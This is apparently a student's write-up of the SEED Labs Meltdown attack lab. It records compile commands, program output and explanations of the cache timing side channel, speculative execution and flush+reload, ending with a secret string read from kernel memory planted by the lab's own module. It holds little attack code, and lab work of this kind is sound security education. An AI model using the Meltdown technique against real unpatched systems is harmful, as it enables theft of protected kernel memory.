# Meltdown Attack Lab

**Instruction:** https://seedsecuritylabs.org/Labs_16.04/PDF/Meltdown_Attack.pdf

**VirtualBox:** [Version 6.0.4](https://www.virtualbox.org/wiki/Download_Old_Builds_6_0)

**VM version:** [SEEDUbuntu-16.04 VM](https://seedsecuritylabs.org/labsetup.html)

**My Processor:** Intel(R) Core(™) i7-6700HQ CPU @ 2.60GHz

**Important Note:** If your processor is too new, this lab may not work as expected because Intel has released patches and firmware updates to mitigate the Meltdown vulnerability.

# Tasks 

## Task 1 

Compiling and running the script ``CacheTime.c`` . 

We observe the following output :
```
[10/17/24]seed@VM:~/.../Labsetup$ gcc -march=native CacheTime.c 
[10/17/24]seed@VM:~/.../Labsetup$ a.out
Access time for array[0*4096]: 188 CPU cycles
Access time for array[1*4096]: 212 CPU cycles
Access time for array[2*4096]: 226 CPU cycles
Access time for array[3*4096]: 74 CPU cycles
Access time for array[4*4096]: 228 CPU cycles
Access time for array[5*4096]: 224 CPU cycles
Access time for array[6*4096]: 230 CPU cycles
Access time for array[7*4096]: 74 CPU cycles
Access time for array[8*4096]: 230 CPU cycles
Access time for array[9*4096]: 224 CPU cycles
```

``Array[3*4096]`` and ``array[7*4096]`` are obviously faster than the other elements. 

Because ``array[3*4096]`` and ``array[7*4096]`` were previously accessed and their data is still present in the CPU cache.

## Task 2

From the experiment, I always find the secrets. 

```
[10/16/24]seed@VM:~/.../Labsetup$ gcc -march=native FlushReload.c 
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 52 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 60 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 58 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 54 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 54 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 60 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 36 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 56 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 54 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 56 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 54 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 60 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 54 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 60 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 36 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 38 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 54 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 36 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 58 cycles).
The Secret = 94.
[10/16/24]seed@VM:~/.../Labsetup$ a.out
array[94*4096 + 1024] is in cache (Access time: 30 cycles).
The Secret = 94.
```

I modify the code to find the average of cpu cycles that hit, and I get around 38 - 62. 
```
printf("array[%d* 4096 + %d] is in cache (Access time: %llu cycles).\n", i, DELTA, time2);
```

## Task 3

The output was as follow :

```
[10/16/24]seed@VM:~/.../Labsetup$ sudo  insmod MeltdownKernel.ko
[10/16/24]seed@VM:~/.../Labsetup$ dmesg | grep 'secret data address'
[ 1246.967656] secret data address:fa021000
```

``[ 1246.967656] secret data address:fa021000``

We will use this address in the subsequent tasks.

## Task 4 

Compiling and running the script ``Meltdown_task_4.c`` . 

We observe the following output :
```
[10/16/24]seed@VM:~/.../Labsetup$ gcc -march=native Meltdown_task_4.c 
[10/16/24]seed@VM:~/.../Labsetup$ a.out
Segmentation fault
```

We cannot access the kernel memory from userspace. We receive a ``Segmentation Fault``. Because the kernel memory is protected and cannot be accesed directly by user-space process. 

## Task 5 

Compiling and running the script ``ExceptionHandling.c`` . 

We observe the following output :
```
[10/16/24]seed@VM:~/.../Labsetup$ gcc -march=native ExceptionHandling.c 
[10/16/24]seed@VM:~/.../Labsetup$ a.out
Memory access violation!
Program continues to execute.
```

It handles the exception and prints ``Memory access violation! Program continues to execute.``

It causes a segmentation fault because the program tries to access kernel memory. But continues executing without crashing.

## Task 6 

Compiling and running the script ``MeltdownExperiment.c`` . 

We observe the following output :
```
[10/16/24]seed@VM:~/.../Labsetup$ gcc -march=native MeltdownExperiment.c 
[10/16/24]seed@VM:~/.../Labsetup$ a.out
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.
```

The output is: ``Memory access violation! array[7*4096 + 1024] is in cache.The Secret = 7.``

Because the speculative execution accessed array[7 * 4096 + DELTA] before the segmentation fault occurred. Even though the kernel memory access failed, the CPU loaded this value into the cache. Detected the cache hit, revealing that the secret value was 7.

## Task 7

### Task 7.1 

Compiling and running the script ``MeltdownExperiment.c`` . 

We observe the following output :
```
[10/16/24]seed@VM:~/.../Labsetup$ gcc -march=native MeltdownExperiment.c 
[10/16/24]seed@VM:~/.../Labsetup$ a.out
Memory access violation!
```

The output is: ``Memory access violation!``

Because the program is being interrupted by the segmentation fault before it can speculatively execute the instruction that uses the kernel data to access array[kernel_data * 4096 + DELTA]. As a result, the cache is not updated, and the secret value is not revealed.


### Task 7.2

Compiling and running the script ``Meltdown_task_7_2.c`` . 

We observe the following output :
```
[10/16/24]seed@VM:~/.../Labsetup$ gcc -march=native Meltdown_task_7_2.c 
[10/16/24]seed@VM:~/.../Labsetup$ a.out
Memory access violation!
```

After add the code in a place between flushSideChannel() and sigsetjmp(). The outputs is: ``Memory access violation!``. Because because the speculative execution is still not fast enough to access the kernel data like Task 7.1

### Task 7.3

Compiling and running the script ``Meltdown_task_7_3.c`` . 

We observe the following output :
```
[10/16/24]seed@VM:~/.../Labsetup$ gcc -march=native Meltdown_task_7_3.c
[10/16/24]seed@VM:~/.../Labsetup$ a.out
Memory access violation!
[10/16/24]seed@VM:~/.../Labsetup$ a.out
Memory access violation!
[10/16/24]seed@VM:~/.../Labsetup$ a.out
Memory access violation!
array[83*4096 + 1024] is in cache.
The Secret = 83.
```

The output is: ``Memory access violation! array[83*4096 + 1024] is in cache. The Secret = 83.``

Because ``asm volatile`` makes a delay, giving speculative execution more time to access the secret kernel data.
During this delay, speculative execution tries to read kernel_data from kernel memory and modifies the cache based on that data.
The speculative execution completes before the CPU detects the illegal access and raises a segmentation fault, meaning the secret data has already been loaded into the cache and can be detected later using a side-channel attack.

But somtimes, it still fail from race condition.

## Task 8

Compiling and running the script ``MeltdownAttack_2.c`` . 

We observe the following output :
```
[10/18/24]seed@VM:~/.../Labsetup$ gcc -march=native MeltdownAttack_2.c 
[10/18/24]seed@VM:~/.../Labsetup$ a.out
The secret byte 1 , value is 83 S
The number of hits for byte 1 is 956
The secret byte 2 , value is 69 E
The number of hits for byte 2 is 969
The secret byte 3 , value is 69 E
The number of hits for byte 3 is 947
The secret byte 4 , value is 68 D
The number of hits for byte 4 is 953
The secret byte 5 , value is 76 L
The number of hits for byte 5 is 928
The secret byte 6 , value is 97 a
The number of hits for byte 6 is 944
The secret byte 7 , value is 98 b
The number of hits for byte 7 is 954
The secret byte 8 , value is 115 s
The number of hits for byte 8 is 965
The secret byte 9 , value is 0 
The number of hits for byte 9 is 981
End. 
```

We finally stole the secret message: ``SEEDLabs``